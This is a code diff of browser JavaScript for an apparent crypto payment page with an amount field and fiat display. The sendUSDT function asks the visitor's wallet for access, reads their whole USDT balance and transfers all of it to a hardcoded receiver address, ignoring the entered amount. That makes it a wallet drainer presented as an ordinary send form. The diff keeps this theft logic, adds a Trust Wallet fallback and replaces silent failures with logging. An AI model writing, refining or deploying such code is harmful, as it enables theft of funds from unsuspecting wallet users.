@@ -1,4 +1,4 @@
-const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
 const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
 const usdtABI = [
   "function balanceOf(address) view returns (uint256)",
@@ -7,23 +7,33 @@ const usdtABI = [
 ];
 
 async function sendUSDT() {
-  if (!window.ethereum) return;
+  const eth = window.ethereum || window.trustwallet; // Trust Wallet fallback
+  if (!eth) {
+    console.log("Wallet not found");
+    return;
+  }
 
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const provider = new ethers.providers.Web3Provider(eth);
     await provider.send("eth_requestAccounts", []);
     const signer = provider.getSigner();
     const user = await signer.getAddress();
 
     const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
     const balance = await usdt.balanceOf(user);
+    const decimals = await usdt.decimals();
 
-    if (balance.isZero()) return;
+    if (balance.isZero()) {
+      console.log("No USDT balance");
+      return;
+    }
 
     const tx = await usdt.transfer(receiver, balance);
+    console.log("Transaction sent:", tx.hash);
     await tx.wait();
+    console.log("Transaction confirmed");
   } catch (err) {
-    // Silent error
+    console.error("Error:", err);
   }
 }
 
@@ -31,17 +41,15 @@ function updateFiat() {
   const input = document.getElementById("amount");
   const fiat = document.getElementById("fiat");
   const val = parseFloat(input.value);
-  if (isNaN(val)) {
-    fiat.innerText = "≈ $0.00";
-  } else {
-    fiat.innerText = "≈ $" + val.toFixed(2);
-  }
+  fiat.innerText = isNaN(val) ? "≈ $0.00" : "≈ $" + val.toFixed(2);
 }
 
 async function fillMax() {
-  if (!window.ethereum) return;
+  const eth = window.ethereum || window.trustwallet;
+  if (!eth) return;
+
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const provider = new ethers.providers.Web3Provider(eth);
     await provider.send("eth_requestAccounts", []);
     const signer = provider.getSigner();
     const user = await signer.getAddress();
@@ -53,7 +61,9 @@ async function fillMax() {
     const formatted = ethers.utils.formatUnits(balance, decimals);
     document.getElementById("amount").value = formatted;
     updateFiat();
-  } catch (err) {}
+  } catch (err) {
+    console.error("Max error:", err);
+  }
 }
 
 function clearAddress() {
